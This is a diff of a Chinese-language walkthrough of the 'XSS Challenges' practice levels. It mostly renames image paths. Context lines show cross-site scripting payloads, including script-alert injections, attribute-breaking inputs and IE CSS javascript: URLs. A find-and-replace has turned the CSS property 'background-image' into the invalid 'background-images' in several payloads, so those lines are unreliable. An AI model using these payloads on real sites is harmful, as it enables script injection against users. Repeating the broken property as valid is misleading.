@@ -22,7 +22,7 @@
 
 提交 hello（使p1=hello）
 
-![查找页面的回显](./../../../../image/XSS%20Challenges/%E6%9F%A5%E6%89%BE%E9%A1%B5%E9%9D%A2%E7%9A%84%E5%9B%9E%E6%98%BE.png)
+![查找页面的回显](./../../../../images/XSS%20Challenges/%E6%9F%A5%E6%89%BE%E9%A1%B5%E9%9D%A2%E7%9A%84%E5%9B%9E%E6%98%BE.png)
 
 查看源码
 
@@ -38,7 +38,7 @@
 <script>alert(document.domain);</script>
 ```
 
-![提交代码](./../../../../image/XSS%20Challenges/%E6%8F%90%E4%BA%A4%E4%BB%A3%E7%A0%81.png)
+![提交代码](./../../../../images/XSS%20Challenges/%E6%8F%90%E4%BA%A4%E4%BB%A3%E7%A0%81.png)
 
 查看源码
 
@@ -64,11 +64,11 @@
 
 在交互栏输入 hello
 
-![在交互栏输入 hello](./../../../../image/XSS%20Challenges/%E5%9C%A8%E4%BA%A4%E4%BA%92%E6%A0%8F%E8%BE%93%E5%85%A5%20hello.png)
+![在交互栏输入 hello](./../../../../images/XSS%20Challenges/%E5%9C%A8%E4%BA%A4%E4%BA%92%E6%A0%8F%E8%BE%93%E5%85%A5%20hello.png)
 
 提交 hello
 
-![提交 hello](./../../../../image/XSS%20Challenges/%E6%8F%90%E4%BA%A4%20hello.png)
+![提交 hello](./../../../../images/XSS%20Challenges/%E6%8F%90%E4%BA%A4%20hello.png)
 
 > 发现回显处发生了改变
 
@@ -156,7 +156,7 @@ hello
 USA
 ```
 
-![提交参数](./../../../../image/XSS%20Challenges/%E5%9C%A8%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%8F%90%E4%BA%A4%E5%8F%82%E6%95%B0.png)
+![提交参数](./../../../../images/XSS%20Challenges/%E5%9C%A8%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%8F%90%E4%BA%A4%E5%8F%82%E6%95%B0.png)
 
 > 发现两个交互栏都有回显
 >
@@ -226,7 +226,7 @@ p1=hello&p2=<script>alert(document.domain);</script>
 
 查看页面
 
-![查看页面](./../../../../image/XSS%20Challenges/%E6%9F%A5%E7%9C%8B%E9%A1%B5%E9%9D%A2.png)
+![查看页面](./../../../../images/XSS%20Challenges/%E6%9F%A5%E7%9C%8B%E9%A1%B5%E9%9D%A2.png)
 
 > 发现有两栏
 
@@ -342,7 +342,7 @@ p3="><script>alert(document.domain)</script>
 hello"> 
 ```
 
-![查看回显](./../../../../image/XSS%20Challenges/%E6%9F%A5%E7%9C%8B%E5%9B%9E%E6%98%BE.png)
+![查看回显](./../../../../images/XSS%20Challenges/%E6%9F%A5%E7%9C%8B%E5%9B%9E%E6%98%BE.png)
 
 > 发现成功闭合，"> 生效
 >
@@ -354,7 +354,7 @@ hello">
 "><script>alert(document.domain);</script>
 ```
 
-![尝试提交 js 代码](./../../../../image/XSS%20Challenges/%E5%B0%9D%E8%AF%95%E6%8F%90%E4%BA%A4%20js%20%E4%BB%A3%E7%A0%81.png)
+![尝试提交 js 代码](./../../../../images/XSS%20Challenges/%E5%B0%9D%E8%AF%95%E6%8F%90%E4%BA%A4%20js%20%E4%BB%A3%E7%A0%81.png)
 
 > 发现字符长度有限制，无法提交 js 代码
 
@@ -857,11 +857,11 @@ hello
 
 使用 IE10 注入，谷歌浏览器分析
 
-![使用 IE10 做访问](./../../../../image/XSS%20Challenges/%E4%BD%BF%E7%94%A8%20IE10%20%E5%81%9A%E8%AE%BF%E9%97%AE.png)
+![使用 IE10 做访问](./../../../../images/XSS%20Challenges/%E4%BD%BF%E7%94%A8%20IE10%20%E5%81%9A%E8%AE%BF%E9%97%AE.png)
 
 开启 burpsuite 配置代理
 
-![开启 burpsuite 配置代理](./../../../../image/XSS%20Challenges/%E5%BC%80%E5%90%AF%20burpsuite%20%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86.png)
+![开启 burpsuite 配置代理](./../../../../images/XSS%20Challenges/%E5%BC%80%E5%90%AF%20burpsuite%20%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86.png)
 
 **查看可控参数**
 
@@ -963,14 +963,14 @@ p1=background-color%3Asalmon
 
 > 发现两处回显为	style和value
 >
-> 其中 style 为 css 代码，可以在 IE 通过 background-image:url() 指定伪协议 
+> 其中 style 为 css 代码，可以在 IE 通过 background-images:url() 指定伪协议 
 
 **判断能否执行 js**
 
 在 IE 提交 payload
 
 ```
-background-image:url(javascript:alert(document.domain));
+background-images:url(javascript:alert(document.domain));
 ```
 
 > 成功注入
@@ -999,26 +999,26 @@ p1=background-color%3Asalmon
 
 >发现两处回显为	style和value
 >
->其中 style 可以在 IE 通过 background-image:url() 指定伪协议 
+>其中 style 可以在 IE 通过 background-images:url() 指定伪协议 
 
 **判断能否执行 js**
 
 在 IE 提交 payload
 
 ```
-background-image:url(javascript:alert(document.domain));
+background-images:url(javascript:alert(document.domain));
 ```
 
 查看回显
 
 ```
-background-image:xxx(javaxxx:alert(document.domain));
+background-images:xxx(javaxxx:alert(document.domain));
 ```
 
 查看源码
 
 ```
-<input type="text" name="p1" size="60" style="background-image:xxx(javaxxx:alert(document.domain));" value="background-image:xxx(javaxxx:alert(document.domain));"> 
+<input type="text" name="p1" size="60" style="background-images:xxx(javaxxx:alert(document.domain));" value="background-images:xxx(javaxxx:alert(document.domain));"> 
 ```
 
 > 发现有过滤，无法执行
